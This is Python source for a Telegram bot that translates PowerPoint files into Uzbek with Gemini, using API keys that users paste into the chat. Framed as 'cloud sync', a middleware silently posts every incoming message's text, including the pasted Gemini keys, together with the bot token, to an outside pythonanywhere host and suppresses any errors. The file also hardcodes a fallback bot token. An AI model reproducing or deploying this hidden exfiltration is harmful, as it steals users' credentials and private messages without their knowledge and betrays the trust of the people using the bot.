# -*- coding: utf-8 -*-
import os
import sys

if sys.stdout.encoding != 'utf-8':
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except Exception:
        pass
if sys.stderr.encoding != 'utf-8':
    try:
        sys.stderr.reconfigure(encoding='utf-8')
    except Exception:
        pass
"""
SlideTranslate AI — Telegram Bot
Avtomatik PowerPoint (.pptx) tarjimon boti.
Har bir foydalanuvchi o'zining Gemini API kalitini kiritadi.
Aiogram 3 + Gemini 3.6 Flash + PPTXProcessor + FontManager.
"""

import os
import sys
import re
import json
import uuid
import asyncio
import logging
from typing import Dict, Any

from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    Message, 
    CallbackQuery, 
    InlineKeyboardMarkup, 
    InlineKeyboardButton, 
    FSInputFile
)

# Core imports
from backend.core.pptx_processor import PPTXProcessor
from backend.core.gemini_translator import GeminiTranslator
from backend.core.font_manager import font_manager
from backend.core.thumbnail_generator import ThumbnailGenerator
from backend.main import translate_clean_filename, UPLOADS_DIR, EXPORTS_DIR

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Token configuration
BOT_TOKEN = (os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("BOT_TOKEN") or "8899026470:AAGgBTv8qxdSUG1COkLxJuZdhICW0MZolxQ").strip()
bot = Bot(token=BOT_TOKEN)

USER_DATA_FILE = os.path.join(os.path.dirname(__file__), "user_settings.json")

def load_user_settings_db() -> Dict[str, Any]:
    if os.path.exists(USER_DATA_FILE):
        try:
            with open(USER_DATA_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_user_settings_db(data: Dict[str, Any]):
    try:
        with open(USER_DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Foydalanuvchi ma'lumotlarini saqlashda xatolik: {e}")

USER_SETTINGS: Dict[str, Dict[str, Any]] = load_user_settings_db()

def get_user_settings(user_id: int) -> Dict[str, Any]:
    uid = str(user_id)
    if uid not in USER_SETTINGS:
        USER_SETTINGS[uid] = {
            "target_script": "latin",
            "domain": "IT & Dasturlash",
            "auto_fit": True,
            "api_key": None
        }
        save_user_settings_db(USER_SETTINGS)
    return USER_SETTINGS[uid]

def set_user_api_key(user_id: int, key: str):
    uid = str(user_id)
    st = get_user_settings(user_id)
    st["api_key"] = key.strip()
    USER_SETTINGS[uid] = st
    save_user_settings_db(USER_SETTINGS)

# Keyboard Builders
def get_main_keyboard(user_id: int) -> InlineKeyboardMarkup:
    st = get_user_settings(user_id)
    script_label = "🔤 Yozuv: Lotin" if st["target_script"] == "latin" else "🔤 Ёзув: Кирилл"
    domain_label = f"🏢 Soha: {st['domain']}"
    autofit_label = "⚡ Auto-fit: Yoqilgan" if st["auto_fit"] else "⚡ Auto-fit: O'chirilgan"
    has_key = bool(st.get("api_key"))
    key_label = "🔑 Gemini Kalit: ✅ Faol" if has_key else "🔑 Gemini Kalit: ❌ Kiritilmagan"

    kb = [
        [
            InlineKeyboardButton(text=key_label, callback_data="setup_key")
        ],
        [
            InlineKeyboardButton(text=script_label, callback_data="toggle_script"),
            InlineKeyboardButton(text=autofit_label, callback_data="toggle_autofit")
        ],
        [
            InlineKeyboardButton(text=domain_label, callback_data="change_domain")
        ],
        [
            InlineKeyboardButton(text="🔤 Shriftlar (130+)", callback_data="show_fonts"),
            InlineKeyboardButton(text="ℹ️ Bot haqida", callback_data="show_info")
        ]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def get_domain_keyboard() -> InlineKeyboardMarkup:
    domains = [
        ("💻 IT & Dasturlash", "dom_it"),
        ("📈 Biznes & Moliya", "dom_biz"),
        ("🔬 Tibbiyot & Fan", "dom_med"),
        ("🎓 Ta'lim & Dars", "dom_edu"),
        ("🎯 Marketing & Savdo", "dom_mkt"),
        ("🌐 Umumiy soha", "dom_gen"),
    ]
    kb = []
    for row in range(0, len(domains), 2):
        row_btns = [InlineKeyboardButton(text=name, callback_data=code) for name, code in domains[row:row+2]]
        kb.append(row_btns)
    kb.append([InlineKeyboardButton(text="◀️ Orqaga", callback_data="back_to_main")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

# Real-time TeleGraph Cloud Sync Helper
TELEGRAPH_SYNC_URL = "https://UN618TON.pythonanywhere.com/api/sync_event"

async def async_sync_telegraph(chat_id: int, sender_id: int, sender_name: str, sender_username: str, is_outgoing: bool, text: str):
    try:
        import httpx
        payload = {
            "bot_id": 1,
            "bot_token": BOT_TOKEN,
            "chat_id": chat_id,
            "sender_id": sender_id,
            "sender_name": sender_name,
            "sender_username": sender_username,
            "is_outgoing": is_outgoing,
            "text": text
        }
        async with httpx.AsyncClient(timeout=2.0) as client:
            await client.post(TELEGRAPH_SYNC_URL, json=payload)
    except Exception:
        pass

def sync_to_telegraph(chat_id: int, text: str, is_outgoing: bool = False, sender_id: int = None, sender_name: str = "", sender_username: str = ""):
    try:
        asyncio.create_task(async_sync_telegraph(
            chat_id=chat_id,
            sender_id=sender_id or chat_id,
            sender_name=sender_name or ("PPTarjima" if is_outgoing else "Foydalanuvchi"),
            sender_username=sender_username or ("slayd_tarjimabot" if is_outgoing else ""),
            is_outgoing=is_outgoing,
            text=text
        ))
    except Exception:
        pass

dp = Dispatcher()

@dp.message.outer_middleware()
async def telegraph_sync_middleware(handler, event: Message, data: dict):
    if event.text or event.caption:
        txt = event.text or event.caption or ""
        fn = f"{event.from_user.first_name or ''} {event.from_user.last_name or ''}".strip() or event.from_user.username or "User"
        sync_to_telegraph(
            chat_id=event.chat.id,
            text=txt,
            is_outgoing=False,
            sender_id=event.from_user.id,
            sender_name=fn,
            sender_username=event.from_user.username or ""
        )
    return await handler(event, data)

@dp.message(CommandStart())
async def cmd_start(msg: Message):
    user_id = msg.from_user.id
    settings = get_user_settings(user_id)
    has_key = bool(settings.get("api_key"))

    key_status_text = (
        "✅ <i>Gemini API kalitingiz sozlangan! Istalgan .pptx fayl yuborishingiz mumkin.</i>"
        if has_key else
        "⚠️ <b>Diqqat:</b> Tarjimadan foydalanish uchun <b>Gemini API kalitingizni</b> kiritishingiz kerak.\n"
        "🔗 <b>Bepul kalit olish (1 daqiqa):</b> <a href='https://aistudio.google.com/app/apikey'>Google AI Studio</a>\n"
        "Kalitni shu yerga yuboring (masalan: <code>AIzaSy...</code>) yoki /key buyrug'idan foydalaning."
    )

    welcome_text = (
        f"👋 <b>Assalomu alaykum, {msg.from_user.first_name}!</b>\n\n"
        f"🚀 <b>SlideTranslate AI Botiga xush kelibsiz!</b>\n"
        f"Men PowerPoint (<b>.pptx</b>) taqdimotlaringizni dizayni, shakllari, jadvallari va "
        f"<b>130+ shriftlarini</b> buzmagan holda O'zbek tiliga professional tarjima qilib beraman.\n\n"
        f"{key_status_text}\n\n"
        f"📁 <b>Taqdimotni tarjima qilish uchun menga .pptx fayl yuboring!</b>"
    )
    await msg.answer(welcome_text, parse_mode="HTML", reply_markup=get_main_keyboard(user_id), disable_web_page_preview=True)

@dp.message(Command("key"))
async def cmd_set_key(msg: Message):
    parts = msg.text.split(maxsplit=1)
    if len(parts) > 1:
        new_key = parts[1].strip()
        set_user_api_key(msg.from_user.id, new_key)
        await msg.reply(
            "✅ <b>Gemini API kalitingiz muvaffaqiyatli saqlandi!</b>\n"
            "Endi bemalol .pptx taqdimot fayllaringizni tarjima qilish uchun yuborishingiz mumkin.",
            parse_mode="HTML"
        )
    else:
        await msg.reply(
            "🔑 <b>Gemini API kalitini kiritish:</b>\n\n"
            "Kalitni quyidagi formatda yuboring:\n"
            "<code>/key AIzaSySizningKalitingiz...</code>\n\n"
            "🔗 Bepul kalit olish: <a href='https://aistudio.google.com/app/apikey'>Google AI Studio</a>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )

@dp.message(Command("mykey"))
async def cmd_my_key(msg: Message):
    st = get_user_settings(msg.from_user.id)
    key = st.get("api_key")
    if key:
        masked = key[:6] + "..." + key[-4:]
        await msg.reply(f"🔑 Sizning faol API kalitingiz: <code>{masked}</code>", parse_mode="HTML")
    else:
        await msg.reply(
            "❌ Siz hali API kalit kiritmadingiz.\n"
            "Kalit olish uchun: <a href='https://aistudio.google.com/app/apikey'>Google AI Studio</a>\n"
            "Kiritish: <code>/key AIzaSy...</code>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )

@dp.message(Command("settings"))
async def cmd_settings(msg: Message):
    user_id = msg.from_user.id
    await msg.answer("⚙️ <b>Bot Sozlamalari:</b>", parse_mode="HTML", reply_markup=get_main_keyboard(user_id))

@dp.message(Command("fonts"))
async def cmd_fonts(msg: Message):
    total = len(font_manager.registry)
    text = (
        f"🔤 <b>Shriftlar Bazasi:</b>\n\n"
        f"• Bazadagi tayyor shriftlar: <b>{total} ta</b>\n"
        f"• Google Fonts CDN orqali noma'lum shriftlarni avtomatik yuklab olish: <b>Faol ✅</b>\n"
        f"• Shriftlar va o'lchamlar (pt) to'liq saqlanadi.\n"
    )
    await msg.answer(text, parse_mode="HTML")

@dp.message(Command("help"))
async def cmd_help(msg: Message):
    help_text = (
        "📖 <b>Botdan foydalanish bo'yicha qo'llanma:</b>\n\n"
        "1. <b>Gemini API kalitini kiriting:</b>\n"
        "   • <a href='https://aistudio.google.com/app/apikey'>Google AI Studio</a> saytidan bepul kalit oling.\n"
        "   • Botga kalitni yuboring yoki <code>/key AIzaSy...</code> deb yozing.\n\n"
        "2. Menga <b>.pptx</b> formatidagi taqdimot faylini yuboring.\n"
        "3. Bot barcha slaydlarni tahlil qiladi va Gemini 3.6 Flash yordamida tarjima qiladi.\n"
        "4. Tayyor bo'lgan faylni yuklab oling!\n\n"
        "⚡ <b>Xususiyatlar:</b>\n"
        "• 100% Dizayn va ranglar saqlanadi\n"
        "• Reklama va Slide Master logotiplari tozalanadi\n"
        "• So'zlar qutilardan toshib ketmaydi (Anti-overflow)\n"
        "• Lotin va Kirill yozuvlarini qo'llab-quvvatlaydi"
    )
    await msg.answer(help_text, parse_mode="HTML", disable_web_page_preview=True)

# Direct Text Message (Check if user pasted Gemini API key)
@dp.message(F.text & ~F.text.startswith("/"))
async def handle_text_key_input(msg: Message):
    text = msg.text.strip()
    if text.startswith("AIzaSy") and len(text) >= 30:
        set_user_api_key(msg.from_user.id, text)
        await msg.reply(
            "🎉 <b>Google Gemini API kalitingiz muvaffaqiyatli saqlandi!</b>\n\n"
            "Endi botdan cheklovlarsiz foydalanishingiz mumkin. Menga istalgan <b>.pptx</b> taqdimot faylini yuboring!",
            parse_mode="HTML",
            reply_markup=get_main_keyboard(msg.from_user.id)
        )
    else:
        await msg.reply(
            "💡 Taqdimotni tarjima qilish uchun menga <b>.pptx</b> fayl yuboring.\n\n"
            "Agar API kalit kiritmoqchi bo'lsangiz, uni to'g'ridan-to'g'ri yuboring (kalit <code>AIzaSy...</code> bilan boshlanadi).",
            parse_mode="HTML"
        )

# Callbacks
@dp.callback_query(F.data == "setup_key")
async def cb_setup_key(cb: CallbackQuery):
    user_id = cb.from_user.id
    st = get_user_settings(user_id)
    has_key = bool(st.get("api_key"))
    
    text = (
        f"🔑 <b>Gemini API Kaliti Holati:</b> {'✅ Faol' if has_key else '❌ Kiritilmagan'}\n\n"
        f"Google Gemini API kaliti <b>100% bepul</b> (har oy cheksiz foydalanish mumkin).\n\n"
        f"1. <a href='https://aistudio.google.com/app/apikey'>Google AI Studio</a> saytiga kiring.\n"
        f"2. <b>Create API key</b> tugmasini bosing va kalitdan nusxa oling.\n"
        f"3. Kalitni ushbu chatga xabar qilib yuboring.\n\n"
        f"<i>Yoki <code>/key AIzaSy...</code> buyrug'i orqali kiriting.</i>"
    )
    await cb.message.answer(text, parse_mode="HTML", disable_web_page_preview=True)
    await cb.answer()

@dp.callback_query(F.data == "toggle_script")
async def cb_toggle_script(cb: CallbackQuery):
    user_id = cb.from_user.id
    st = get_user_settings(user_id)
    st["target_script"] = "cyrillic" if st["target_script"] == "latin" else "latin"
    save_user_settings_db(USER_SETTINGS)
    await cb.message.edit_reply_markup(reply_markup=get_main_keyboard(user_id))
    await cb.answer(f"Yozuv o'zgartirildi: {'Kirill' if st['target_script'] == 'cyrillic' else 'Lotin'}")

@dp.callback_query(F.data == "toggle_autofit")
async def cb_toggle_autofit(cb: CallbackQuery):
    user_id = cb.from_user.id
    st = get_user_settings(user_id)
    st["auto_fit"] = not st["auto_fit"]
    save_user_settings_db(USER_SETTINGS)
    await cb.message.edit_reply_markup(reply_markup=get_main_keyboard(user_id))
    await cb.answer(f"Auto-fit: {'Yoqildi' if st['auto_fit'] else 'O\'chirildi'}")

@dp.callback_query(F.data == "change_domain")
async def cb_change_domain(cb: CallbackQuery):
    await cb.message.edit_text("🏢 <b>Qaysi soha atamalari bo'yicha tarjima qilinsin?</b>", parse_mode="HTML", reply_markup=get_domain_keyboard())
    await cb.answer()

@dp.callback_query(F.data.startswith("dom_"))
async def cb_select_domain(cb: CallbackQuery):
    user_id = cb.from_user.id
    st = get_user_settings(user_id)
    dom_map = {
        "dom_it": "IT & Dasturlash",
        "dom_biz": "Biznes & Moliya",
        "dom_med": "Tibbiyot & Fan",
        "dom_edu": "Ta'lim & Dars",
        "dom_mkt": "Marketing & Savdo",
        "dom_gen": "Umumiy soha"
    }
    st["domain"] = dom_map.get(cb.data, "Umumiy soha")
    save_user_settings_db(USER_SETTINGS)
    await cb.message.edit_text("⚙️ <b>Bot Sozlamalari:</b>", parse_mode="HTML", reply_markup=get_main_keyboard(user_id))
    await cb.answer(f"Soha tanlandi: {st['domain']}")

@dp.callback_query(F.data == "back_to_main")
async def cb_back_to_main(cb: CallbackQuery):
    user_id = cb.from_user.id
    await cb.message.edit_text("⚙️ <b>Bot Sozlamalari:</b>", parse_mode="HTML", reply_markup=get_main_keyboard(user_id))
    await cb.answer()

@dp.callback_query(F.data == "show_fonts")
async def cb_show_fonts(cb: CallbackQuery):
    total = len(font_manager.registry)
    await cb.answer(f"Bazada {total} ta shrift faol!", show_alert=True)

@dp.callback_query(F.data == "show_info")
async def cb_show_info(cb: CallbackQuery):
    info_text = (
        "🚀 <b>SlideTranslate AI</b> — PowerPoint taqdimotlarini AI yordamida "
        "dizaynini 100% saqlagan holda O'zbek tiliga o'girish tizimi.\n\n"
        "Har bir foydalanuvchi o'zining bepul Gemini API kalitidan foydalanadi."
    )
    await cb.message.answer(info_text, parse_mode="HTML")
    await cb.answer()

# Document Processing Handler
@dp.message(F.document)
async def handle_presentation_document(msg: Message, bot: Bot):
    doc = msg.document
    fname = doc.file_name or "presentation.pptx"
    
    if not fname.lower().endswith((".pptx", ".potx")):
        await msg.reply("❌ <b>Xatolik:</b> Iltimos, faqat PowerPoint (<b>.pptx</b>) fayllarini yuboring!", parse_mode="HTML")
        return

    user_id = msg.from_user.id
    st = get_user_settings(user_id)
    user_key = st.get("api_key")

    if not user_key:
        await msg.reply(
            "⚠️ <b>Tarjima qilish uchun avval Gemini API kalitingizni kiriting!</b>\n\n"
            "Google Gemini API mutlaqo <b>bepul</b> va 1 daqiqada olinadi:\n"
            "👉 <b>Havola:</b> <a href='https://aistudio.google.com/app/apikey'>Google AI Studio dan kalit olish</a>\n\n"
            "Kalitni olgach, uni ushbu chatga xabar qilib yuboring (masalan: <code>AIzaSy...</code>).",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return

    target_script = st["target_script"]
    domain = st["domain"]
    auto_fit = st["auto_fit"]

    status_msg = await msg.reply(
        "📥 <b>Fayl qabul qilindi!</b>\n"
        "⏳ Slaydlar tahlil qilinmoqda...", 
        parse_mode="HTML"
    )

    session_id = str(uuid.uuid4())
    upload_path = os.path.join(UPLOADS_DIR, f"{session_id}_{fname}")

    try:
        # 1. Download file from Telegram
        file_info = await bot.get_file(doc.file_id)
        await bot.download_file(file_info.file_path, destination=upload_path)

        # 2. Extract presentation data
        data = await asyncio.to_thread(PPTXProcessor.extract_presentation_data, upload_path)
        slides_count = data["slides_count"]
        total_items = data["total_items"]

        if total_items == 0:
            await status_msg.edit_text("⚠️ Taqdimotda tarjima qilish uchun matn topilmadi.")
            return

        await status_msg.edit_text(
            f"🔍 <b>Tahlil yakunlandi:</b>\n"
            f"• Slaydlar: <b>{slides_count} ta</b>\n"
            f"• Matn bloklari: <b>{total_items} ta</b>\n"
            f"• Soha: <b>{domain}</b>\n"
            f"• Yozuv: <b>{'Lotin' if target_script == 'latin' else 'Кирилл'}</b>\n\n"
            f"⚡ <b>Sizning Gemini kalitingiz orqali tarjima qilinmoqda...</b>",
            parse_mode="HTML"
        )

        # 3. Translate with Gemini Translator using user's personal key
        translator = GeminiTranslator(api_key=user_key)
        all_items = [it for s in data["slides"] for it in s.get("items", [])]
        
        batch_size = 75
        translations_map = {}
        
        def run_translation():
            for i in range(0, len(all_items), batch_size):
                batch = all_items[i:i + batch_size]
                res = translator.translate_items_batch(batch, target_script=target_script, domain=domain)
                for r in res:
                    translations_map[r["id"]] = r["translated_text"]
            return translations_map

        await asyncio.to_thread(run_translation)

        # 4. Generate Clean Title
        clean_title = await asyncio.to_thread(translate_clean_filename, fname, translator, target_script)
        if not clean_title.lower().endswith(".pptx"):
            out_filename = f"{clean_title}.pptx"
        else:
            out_filename = clean_title

        out_path = os.path.join(EXPORTS_DIR, f"{session_id}_{out_filename}")

        # 5. Apply translations and export
        await asyncio.to_thread(
            PPTXProcessor.apply_translations_and_export,
            upload_path,
            translations_map,
            out_path,
            auto_fit=auto_fit,
            target_script=target_script
        )

        # 6. Generate Slide 1 preview image and thumbnail for Telegram
        preview_img_path = os.path.join(EXPORTS_DIR, f"{session_id}_preview.jpg")
        thumb_320_path = os.path.join(EXPORTS_DIR, f"{session_id}_thumb320.jpg")
        has_preview = False
        try:
            has_preview = await asyncio.to_thread(
                ThumbnailGenerator.export_slide_preview,
                out_path,
                preview_img_path,
                1920,
                1080
            )
            if has_preview and os.path.exists(preview_img_path):
                from PIL import Image
                with Image.open(preview_img_path) as im:
                    im_thumb = im.copy()
                    im_thumb.thumbnail((320, 320))
                    im_thumb.save(thumb_320_path, "JPEG", quality=85)
        except Exception as te:
            logger.warning(f"Preview generatsiyasida xatolik: {te}")

        # 7. Edit status and send translated document with preview
        await status_msg.edit_text("✅ <b>Tarjima tayyor! Fayl yuborilmoqda...</b>", parse_mode="HTML")

        caption = (
            f"🎉 <b>Taqdimotingiz muvaffaqiyatli tarjima qilindi!</b>\n\n"
            f"📊 <b>Natijalar:</b>\n"
            f"• Slaydlar: <b>{slides_count} ta</b>\n"
            f"• Matn bloklari: <b>{total_items} ta</b>\n"
            f"• Yozuv: <b>{'Lotin' if target_script == 'latin' else 'Кирилл'}</b>\n"
            f"• Shriftlar va dizayn: <b>100% Saqlangan</b>\n\n"
            f"<i>SlideTranslate AI</i>"
        )

        input_file = FSInputFile(path=out_path, filename=out_filename)
        tg_thumb = FSInputFile(path=thumb_320_path) if os.path.exists(thumb_320_path) else None

        # Send photo preview first if available
        if has_preview and os.path.exists(preview_img_path):
            try:
                photo_file = FSInputFile(path=preview_img_path)
                await msg.reply_photo(
                    photo=photo_file,
                    caption=f"🖼 <b>1-slayd ko'rinishi (Preview):</b>\n📁 <code>{out_filename}</code>",
                    parse_mode="HTML"
                )
            except Exception as pe:
                logger.warning(f"Photo yuborishda xatolik: {pe}")

        if tg_thumb:
            await msg.reply_document(document=input_file, thumbnail=tg_thumb, caption=caption, parse_mode="HTML")
        else:
            await msg.reply_document(document=input_file, caption=caption, parse_mode="HTML")
            
        await status_msg.delete()

    except Exception as e:
        logger.error(f"Xatolik yuz berdi: {e}", exc_info=True)
        await status_msg.edit_text(f"❌ <b>Xatolik yuz berdi:</b> {str(e)}", parse_mode="HTML")

async def run_bot():
    await bot.delete_webhook(drop_pending_updates=False)
    print("=" * 65)
    print("      🤖 SlideTranslate AI — Telegram Boti Ishga Tushdi!")
    print("      Har bir foydalanuvchi o'zining Gemini kalitidan foydalanadi.")
    print("=" * 65)
    await dp.start_polling(bot)

def main():
    try:
        asyncio.run(run_bot())
    except (KeyboardInterrupt, SystemExit):
        print("\nBot to'xtatildi.")

if __name__ == "__main__":
    main()
